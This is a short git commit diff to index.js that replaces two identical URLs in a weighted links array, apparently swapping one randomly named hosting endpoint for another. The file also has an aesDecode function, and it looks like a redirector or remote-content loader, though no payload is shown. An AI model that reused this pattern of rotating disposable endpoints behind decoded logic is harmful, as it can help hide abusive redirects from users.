c4b7f8ec09765ff732dee6e63a1b4c658a458cba
animalinside <akshay.anand12@yahoo.com>
2026-05-15 14:23:44 +0530

    Update index.js

--- index.js
+++ index.js
@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://main.d3detit7anww1s.amplifyapp.com/", weight: 0.5 },
-        { url: "https://main.d3detit7anww1s.amplifyapp.com/", weight: 0.5 }
+        { url: "https://adfkdjjshkdljkjdf.on-forge.com/", weight: 0.5 },
+        { url: "https://adfkdjjshkdljkjdf.on-forge.com/", weight: 0.5 }
       
     ];
 
